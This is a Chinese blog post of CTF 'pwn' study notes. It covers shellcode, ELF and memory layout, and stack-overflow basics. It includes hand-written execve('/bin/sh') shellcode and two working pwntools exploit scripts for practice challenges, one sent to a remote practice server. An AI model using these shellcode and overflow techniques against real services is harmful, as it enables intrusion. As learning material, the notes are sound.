<!DOCTYPE html>
<html>
  <head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  <meta name="description" content="When there is a will, there is a way.">
  <meta name="keyword" content="hexo-theme, vuejs">
  
    <link rel="shortcut icon" href="/css/images/logo.png">
  
  <title>
    
      Pwn 学习笔记 | GENIA
    
  </title>
  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
  
  
  
  
    <!-- MathJax support START -->
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <!-- MathJax support END -->
  


  
  
    
<script src="/js/local-search.js"></script>


<meta name="generator" content="Hexo 6.3.0"></head>
<div class="wechat-share">
  <img src="/css/images/logo.png" />
</div>
  <body>
    <header class="header fixed-header">
  <div class="header-container">
    <a class="home-link" href="/">
      <div class="logo"></div>
      <span>GENIA</span>
    </a>
    <ul class="right-list">
      
        <li class="list-item">
          
            <a href="/" class="item-link">Home</a>
          
        </li>
      
        <li class="list-item">
          
            <a href="/tags/" class="item-link">Tags</a>
          
        </li>
      
        <li class="list-item">
          
            <a href="/archives/" class="item-link">Archives</a>
          
        </li>
      
        <li class="list-item">
          
            <a href="/about/" class="item-link">About</a>
          
        </li>
      
      
        <li class="menu-item menu-item-search right-list">
    <a role="button" class="popup-trigger">
        <i class="fa fa-search fa-fw"></i>
    </a>
</li>
      
    </ul>
    <div class="menu">
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </div>
    <div class="menu-mask">
      <ul class="menu-list">
        
          <li class="menu-item">
            
              <a href="/" class="menu-link">Home</a>
            
          </li>
        
          <li class="menu-item">
            
              <a href="/tags/" class="menu-link">Tags</a>
            
          </li>
        
          <li class="menu-item">
            
              <a href="/archives/" class="menu-link">Archives</a>
            
          </li>
        
          <li class="menu-item">
            
              <a href="/about/" class="menu-link">About</a>
            
          </li>
        
      </ul>
    </div>
    
      <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
            <span class="search-icon">
                <i class="fa fa-search"></i>
            </span>
            <div class="search-input-container">
                <input autocomplete="off" autocapitalize="off"
                    placeholder="Please enter your keyword(s) to search." spellcheck="false"
                    type="search" class="search-input">
            </div>
            <span class="popup-btn-close">
                <i class="fa fa-times-circle"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>
    
  </div>
</header>

    <div id="article-banner">
  <h2>Pwn 学习笔记</h2>
  <p class="post-date">2023-12-08</p>
  <div class="arrow-down">
    <a href="javascript:;"></a>
  </div>
</div>
<main class="app-body flex-box">
  <!-- Article START -->
  <article class="post-article">
    <section class="markdown-content"><p>参考资料：</p>
<p><a target="_blank" rel="noopener" href="https://www.wenjiangs.com/doc/n5pttfb1zy">4.12 利用 __stack_chk_fail - CTF 竞赛权威指南 Pwn 篇 - 开发文档 - 文江博客 (wenjiangs.com)</a></p>
<p>星盟 Pwn 公开课</p>
<h2 id="攻击概要"><a href="#攻击概要" class="headerlink" title="攻击概要"></a>攻击概要</h2><p>expoit 攻击脚本，一整套攻击方案</p>
<p>payload 攻击载荷，构造的恶意数据</p>
<p>shellcode 调用攻击目标shell的机器码</p>
<p>一道题目，会提供服务器的IP和对应的端口，计网知识</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458292260&idx=1&sn=b60fb9a1de8a54e664ca3a243e26fd22&chksm=b181a0ae86f629b8170fd0ed749cae320c55ccdab864cc8bffb3931b8a23ec499e528cb213e1&scene=27">一步一步学pwntools (qq.com)</a></p>
<hr>
<p>nc 是什么命令？</p>
<p>是”Netcat”的缩写，用于网络通信的工具，可以在不同的网络层级上进行数据传输和操作。可以用于TCP&#x2F;IP和UDP套接字的创建和连接、监听端口和处理传入连接、发送和接收数据流，进行网络调试和测试。</p>
<p>nc  [options]  host（目标主机的名称）  port（目标主机的端口号）</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/600617533">nc命令用法实例总结 - 知乎 (zhihu.com)</a></p>
<p>buu第一道pwn</p>
<hr>
<p>运行exp脚本攻击远程服务器的逻辑是什么？</p>
<p>把payload顺着网线送过去了（具体是个什么过程 ），获得了shell的控制权，然后控制服务器得到flag。</p>
<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>通过软件漏洞利用过程中使用一小段机器代码</p>
<p>作用包括但不限于 启用shell进行交互、打开服务器端口等待连接、反向连接端口（？）</p>
<h3 id="shellcode-编写"><a href="#shellcode-编写" class="headerlink" title="shellcode 编写"></a><strong>shellcode 编写</strong></h3><p>简单的实验：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&quot;unistd.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gcc 编译后用 gdb 调试：</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95shellcode.png" class="">

<p>当执行到 system(“&#x2F;bin&#x2F;sh”) 时，先 call plt表，再根据 plt 表找到 system 函数。</p>
<p>当可容纳 shellcode 的空间较小时，以上方法不再成立。</p>
<h3 id="问题及解决"><a href="#问题及解决" class="headerlink" title="问题及解决"></a>问题及解决</h3><p>解题过程中，shellcode 的大小被控制在几十个字节以内，而且由于地址未知，我们无法直接调用系统函数。</p>
<ul>
<li>触发中断（int 0x80 或者 syscall），进行系统调用</li>
<li>使用 system 的底层调用 execve(“&#x2F;bin&#x2F;sh”,0,0)</li>
</ul>
<p>syscall 调用表：<a target="_blank" rel="noopener" href="https://publicki.top/syscall.html">https://publicki.top/syscall.html</a></p>
<p>32位步骤：</p>
<ol>
<li>设置 ebx 指向 &#x2F;bin&#x2F;sh</li>
<li>ecx &#x3D; 0,edx &#x3D; 0</li>
<li>eax &#x3D; 0xb</li>
<li>int 0x80 触发中断调用</li>
</ol>
<p>用汇编做一个简单实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">;通过nasm编译汇编文件并生成可执行文件，需要使用链接器（ld）将生成的目标文件与C runtime库链接起来。</span><br><span class="line">;nasm -f elf32 shellcode.asm -o shellcode.o</span><br><span class="line">;ld -m elf_i386 -o shellcode shellcode.o</span><br><span class="line"></span><br><span class="line">section .data</span><br><span class="line">    shell db &#x27;/bin/sh&#x27;, 0    ; 存储 /bin/sh 字符串，并在末尾添加 null 字节</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; 1.设置 ebx 指向 /bin/sh</span><br><span class="line">    xor eax, eax            ; 将 eax 清零</span><br><span class="line">    mov ebx, shell          ; 将 ebx 设置为字符串 /bin/sh 的地址</span><br><span class="line"></span><br><span class="line">    ; 2.设置 ecx 和 edx 的值为 0</span><br><span class="line">    xor ecx, ecx            ; 将 ecx 清零</span><br><span class="line">    xor edx, edx            ; 将 edx 清零</span><br><span class="line"></span><br><span class="line">    ; 3.设置 eax 为 0xb (execve系统调用号)</span><br><span class="line">    mov eax, 0x0b           ; 设置 eax 为系统调用号 0xb (execve)</span><br><span class="line"></span><br><span class="line">    ; 4.触发中断调用</span><br><span class="line">    int 0x80               ; 执行系统调用</span><br><span class="line"></span><br><span class="line">    ; 退出程序</span><br><span class="line">    xor eax, eax            ; 将 eax 清零，表示正常退出</span><br><span class="line">    mov ebx, eax            ; 将 ebx 设置为返回码（通常为0）</span><br><span class="line">    inc eax                 ; 将 eax 设置为 1 (exit syscall)</span><br><span class="line">    int 0x80               ; 执行系统调用，退出程序</span><br></pre></td></tr></table></figure>

<p>将汇编编译后得到的可执行文件用 gdb 调试：</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/shellcode_asm.png" class="">

<p>可以不再使用不知道地址的函数。</p>
<p>64位步骤：</p>
<ul>
<li>设置 rdi 指向 &#x2F;bin&#x2F;sh</li>
<li>rsi &#x3D; 0，rdx&#x3D; 0</li>
<li>rax &#x3D; 0x3b</li>
<li>syscall 进行系统调用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">;nasm -f elf64 shellcode64.asm -o shellcode64.o</span><br><span class="line">;ld -m elf_x86_64 -s -o shellcode64 shellcode64.o</span><br><span class="line"></span><br><span class="line">section .data</span><br><span class="line">    shell db &#x27;/bin/sh&#x27;, 0   ; 存储 /bin/sh 字符串，并在末尾添加 null 字节</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; 1.设置 rdi 指向 /bin/sh</span><br><span class="line">    xor rdi, rdi            ; 将 rdi 清零</span><br><span class="line">    mov rdi, shell          ; 将 rdi 设置为字符串 /bin/sh 的地址</span><br><span class="line"></span><br><span class="line">    ; 2.设置 rsi 和 rdx 的值为 0</span><br><span class="line">    xor rsi, rsi            ; 将 rsi 清零</span><br><span class="line">    xor rdx, rdx            ; 将 rdx 清零</span><br><span class="line"></span><br><span class="line">    ; 3.设置 rax 为 0x3b (execve系统调用号)</span><br><span class="line">    mov rax, 0x3b           ; 设置 rax 为系统调用号 0x3b (execve)</span><br><span class="line"></span><br><span class="line">    ; 4.使用syscall指令进行系统调用</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; 退出程序</span><br><span class="line">    xor rax, rax            ; 将 rax 清零，表示正常退出</span><br><span class="line">    add rax, 60             ; 将 rax 设置为 60 (exit系统调用号)</span><br><span class="line">    xor rdi, rdi            ; 将 rdi 设置为返回码（通常为0）</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>一样可以得到shell。</p>
<h3 id="使用工具快速生成"><a href="#使用工具快速生成" class="headerlink" title="使用工具快速生成"></a>使用工具快速生成</h3><p>使用pwntools：</p>
<ul>
<li>设置目标架构</li>
<li>生成shellcode</li>
</ul>
<p>32位:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>

<p>64位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>

<p>使用pwntools直接生成的 shellcode 不存在 00 字符。</p>
<p>PS：一般工具直接生成的 shellcode 会比手写的长一点。</p>
<h3 id="例题1：mrctf2020-shellcode"><a href="#例题1：mrctf2020-shellcode" class="headerlink" title="例题1：mrctf2020_shellcode"></a>例题1：mrctf2020_shellcode</h3><img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/mrctf2020_shellcode.png" class="">

<p>向缓冲区 buf 中读入 400h 内容，eax（输入的字节个数）与0比较，不为0时调用执行读入的内容。</p>
<p>这里使用了 call rax，所以 IDA F5失效了。（？）</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4.png" class="">

<p>查看保护，无 NX，所以可以实现栈上的代码执行。且拥有可读写执行的段。</p>
<p>很明显直接输入shellcode即可，不管是用pwntools直接生成还是用手写的代码都行。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])  <span class="comment">#need tmux</span></span><br><span class="line">p = process(<span class="string">&#x27;./mrctf2020_shellcode&#x27;</span>)</span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx,0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload1 = asm(shellcode1)</span><br><span class="line"></span><br><span class="line">payload2 = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.send(payload1)</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这题卡死在一个很蠢的点上一直打不通。rdi 中本来应该存储 “&#x2F;bin&#x2F;sh”字符串的地址，我把它直接传给 rdi 了。正确的操作是把它放到栈上，然后把 rsp 的值传给 rdi。</p>
<p>当然用 pwntools 直接生成更简单。两种都可以打通。</p>
<h3 id="例题2：ciscn-2019-s-9"><a href="#例题2：ciscn-2019-s-9" class="headerlink" title="例题2：ciscn_2019_s_9"></a>例题2：ciscn_2019_s_9</h3><img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/s_9.png" class="">

<p>fflush(stdin)：刷新缓冲区,将缓冲区内的数据清空并丢弃。 fflush(stdout)：刷新缓冲区,将缓冲区内的数据输出到设备。</p>
<p>查看函数列表，可以发现一个 hint：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">hint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __asm &#123; jmp     esp &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fgets 处可以用于实现溢出，查看保护，栈可执行。如果直接构造 ROP 链可能这里能溢出的长度不是很够。</p>
<p>思路：通过 fgets 将 shellcode 写入栈，再将 return 的地址覆盖为 jmp esp，即可执行栈上的内容。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ciscn_s_9&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29792</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor   eax,eax</span></span><br><span class="line"><span class="string">push  0x0068732f</span></span><br><span class="line"><span class="string">push  0x6e69622f</span></span><br><span class="line"><span class="string">mov   ebx,esp</span></span><br><span class="line"><span class="string">mov   al,0xb</span></span><br><span class="line"><span class="string">int   0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">hint_addr = <span class="number">0x8048554</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">shell = <span class="string">&quot;sub esp,0x28;call esp&quot;</span></span><br><span class="line">shell = asm(shell)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x24</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(hint_addr) <span class="comment"># jmp esp</span></span><br><span class="line"></span><br><span class="line">payload += shell</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>汇编还是非常重要的，要经常复习。</p>
<h2 id="二进制基础"><a href="#二进制基础" class="headerlink" title="二进制基础"></a>二进制基础</h2><h3 id="程序的编译和链接"><a href="#程序的编译和链接" class="headerlink" title="程序的编译和链接"></a>程序的编译和链接</h3><p>对C语言代码进行预处理——&gt;预处理之后的C代码——&gt;编译——&gt;汇编代码——&gt;汇编——&gt;生成机器码</p>
<p>链接——&gt; 将多个机器码的目标文件链接成一个可执行文件（指令的执行需要用到操作系统的一些链接库）</p>
<h3 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h3><p>不同的操作系统不同的名称，本质还是二进制文件</p>
<p>可执行程序（exe&#x2F;out），动态链接库（dll&#x2F;so），静态链接库（lib&#x2F;a）</p>
<h3 id="ELF-文件结构"><a href="#ELF-文件结构" class="headerlink" title="ELF 文件结构"></a>ELF 文件结构</h3><p>头、节、段 </p>
<p>一个段可以包含多个节，段是用来规定程序的可读写执行权限的。</p>
<p>节视图用于 ELF 文件 编译链接时 与 在磁盘上存储时 的文件结构的组织</p>
<p>代码段包含了代码与只读数据</p>
<p>数据段包含了可读可写的数据</p>
<p>查看ELF文件结构</p>
<p>objdump -s elf</p>
<p>cat &#x2F;程序对应的进程号&#x2F;pid&#x2F;maps  查看内存中的内容</p>
<p>显示进程的内存映射信息，包括内存地址范围、权限、偏移量、设备号、inode号和映射的文件路径等。每一行表示一个内存映射区域。</p>
<h3 id="磁盘中的-ELF（可执行文件）和-内存中的-ELF（进程内存映像）"><a href="#磁盘中的-ELF（可执行文件）和-内存中的-ELF（进程内存映像）" class="headerlink" title="磁盘中的 ELF（可执行文件）和 内存中的 ELF（进程内存映像）"></a>磁盘中的 ELF（可执行文件）和 内存中的 ELF（进程内存映像）</h3><p>ELF 文件到虚拟地址空间的映射，在物理内存中是不连续的，虚拟内存（抽象层）中是连续的</p>
<p>可执行文件和源代码均存在磁盘上，当需要执行时，需要为可执行文件分配一段虚拟内存，将可执行文件映射到虚拟内存中供CPU读取使用。</p>
<p>地址以字节编码，常以16进制表示</p>
<p>虚拟内存用户空间每个进程一份</p>
<p>虚拟内存内核空间所有进程共享一份</p>
<p>虚拟内存mmap段中的动态链接库仅在物理内存中装载一份</p>
<p>前面两个加起来是 4GB （32位）</p>
<p>操作系统的基础由 gnu 和 操作系统内核组成</p>
<p>再加上软件源、用户态软件</p>
<p>内核和驱动起到的是管理硬件的作用</p>
<p>内存中的数据的写入是从低地址写到高地址</p>
<p>人类视觉：由上到下</p>
<p>程序视觉：由下到上</p>
<h3 id="程序数据是如何在内存中组织的？"><a href="#程序数据是如何在内存中组织的？" class="headerlink" title="程序数据是如何在内存中组织的？"></a>程序数据是如何在内存中组织的？</h3><p>未初始化的全局变量存储在 Bss</p>
<p>字符串如果是只读数据，依旧会被放在代码段（rodata）</p>
<p>如果分配的是堆上的内存，那读取的内容存放在堆内存中，例如malloc这种</p>
<h3 id="大端序和小端序"><a href="#大端序和小端序" class="headerlink" title="大端序和小端序"></a>大端序和小端序</h3><p>小端序比较常见，指低地址存放数据低位、高地址存放数据高位（LSB）</p>
<p>大端序和小端序相反，低地址存放数据高位、高地址存放数据低位（MSB）</p>
<h3 id="CPU-和-内存配合执行数据"><a href="#CPU-和-内存配合执行数据" class="headerlink" title="CPU 和 内存配合执行数据"></a>CPU 和 内存配合执行数据</h3><p>内存将对应的数据和指令机器码送到 CPU ，CPU执行指令的过程中将一些数据再返还到内存中。CPU 通过内部的寄存器暂存数据（比如参数值或中间计算结果）。</p>
<h3 id="动态链接的程序的执行过程（？）"><a href="#动态链接的程序的执行过程（？）" class="headerlink" title="动态链接的程序的执行过程（？）"></a>动态链接的程序的执行过程（？）</h3><p>我们运行程序时，操作系统的内核会创建一个新的进程，为程序提供运行环境。新的进程通过执行系统调用 <code>execve</code> 进入内核（内核负责管理计算机的底层资源和提供一些功能的接口）。进入内核后，内核执行一些初始化操作，准备好运行环境。其中涉及一些底层的函数和操作，可以简单理解为内核在为程序做一些准备工作。</p>
<p>接着使用动态链接器（如 ld.so）来加载和链接所需的动态链接库。ld.so 是一个系统级的库文件，它在程序运行时负责加载动态链接库，并将其与程序进行动态连接， 还提供符号解析、重定位等功能，确保库函数的正确调用和运行。</p>
<p>然后，进程会开始执行可执行文件中的 <code>_start</code> 标签所对应的代码。这段代码通常是由编译器生成的，它会执行一些底层的初始化操作，例如设置堆栈、加载寄存器等。在 <code>_start</code> 代码执行的过程中，会调用名为 <code>__libc_start_main</code> 的函数。负责进行动态链接的初始化工作。</p>
<p><code>__libc_start_main</code> 函数的最后一步即调用 <code>main</code> 函数。</p>
<p>编写程序代码 ——&gt; 编译生成可执行文件 ——&gt; 运行可执行文件 ——&gt; 内核初始化 ——&gt; 动态链接器加载和链接所需的动态链接库——&gt;执行 <code>_start</code> 代码 ——&gt; 调用 <code>__libc_start_main</code> 函数 ——&gt; 执行 <code>main</code> 函数</p>
<p>这个过程中，计算机的内核负责提供运行环境和执行所需的底层操作，程序通过和内核提供的接口进行交互，实现所需的功能。</p>
<p>动态链接的程序在执行过程中，并不在开始时将所有的库函数代码和数据嵌入到可执行文件中，而是在需要时进行动态加载和链接。动态链接器负责在程序运行时加载和链接所需的动态链接库，这使得多个程序可以共享同一个动态链接库，节省磁盘空间和内存。动态链接的程序具有更好的可扩展性和灵活性，因为库的更新和替换可以独立于可执行文件的重新编译和发布。相较于静态链接的程序，动态链接的程序在启动时会经过动态链接器的初始化过程，包括加载动态链接库和设置环境等操作，可能在执行过程中引入一些额外的开销，例如加载和链接动态链接库的时间。但由于多个程序可以共享同一个动态链接库，整体上可以提供更好的内存利用率。</p>
<p>ld.so的功能和调用时机与__libc_start_main是否有重合？以及重定位等功能具体怎么理解，是怎么实现的？</p>
<h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><p>主要是x86</p>
<p>amd64向下兼容x86</p>
<p>rax（8bytes）——&gt;取低四位——&gt;eax（4bytes）——&gt;ax（2bytes）——&gt;al+ah（1bytes）</p>
<p>主要的几个寄存器：rip、rsp、rbp、rax</p>
<h3 id="查看文件所用-libc-版本"><a href="#查看文件所用-libc-版本" class="headerlink" title="查看文件所用 libc 版本"></a>查看文件所用 libc 版本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/buu/wustctf2020_easyfast$ ldd &#x27;/home/giantbranch/Desktop/buu/wustctf2020_easyfast/wustctf2020_easyfast&#x27; </span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffe029f8000)</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0d77032000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007f0d773fc000)</span><br><span class="line">giantbranch@ubuntu:~/Desktop/buu/wustctf2020_easyfast$ ls -alh /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">lrwxrwxrwx 1 root root 12 Apr 21  2021 /lib/x86_64-linux-gnu/libc.so.6 -&gt; libc-2.23.so</span><br></pre></td></tr></table></figure>

<h2 id="栈溢出基础"><a href="#栈溢出基础" class="headerlink" title="栈溢出基础"></a>栈溢出基础</h2><p>函数调用栈是一块连续的内存区域，用于保存程序运行过程中的状态信息（函数参数、局部变量……）</p>
<p><strong>函数调用栈在内存中由高地址向低地址生长，栈顶对应的内存地址在压栈时变小，退栈时变大</strong>。</p>
<h3 id="主要的寄存器"><a href="#主要的寄存器" class="headerlink" title="主要的寄存器"></a>主要的寄存器</h3><p>esp：存储栈顶地址</p>
<p>ebp：存储栈底地址</p>
<p>eip：存储即将执行的程序指令的地址</p>
<h3 id="函数调用开始"><a href="#函数调用开始" class="headerlink" title="函数调用开始"></a>函数调用开始</h3><p>核心任务：保存调用函数的状态，创建被调用函数的状态。</p>
<p>将被调用函数的参数逆序入栈 ——&gt; 将被调用函数进行调用后的下一条地址入栈（被调用函数的返回地址） ——&gt; 将当前 ebp 寄存器的值入栈 ——&gt; 将 ebp 的值更新为当前栈顶的地址（mov ebp，esp）——&gt; 将被调用函数的局部变量等数据入栈</p>
<p>发生调用时，程序还会将被调用函数的指令地址存放在 eip 内，以便函数依次执行被调用函数的指令。</p>
<h3 id="函数调用结束"><a href="#函数调用结束" class="headerlink" title="函数调用结束"></a>函数调用结束</h3><p>核心任务：丢弃被调用函数的状态，将栈顶恢复为调用函数的状态。</p>
<p>被调用函数的局部变量弹出 ——&gt; 栈顶指向被调用函数的基地址 ——&gt; 将调用函数的基地址弹出，保存在 ebp 内（pop ebp）——&gt; ebp 恢复到调用被调用函数之前的位置 ——&gt; 将调用函数的返回地址弹出，保存在 eip 中（pop eip）</p>
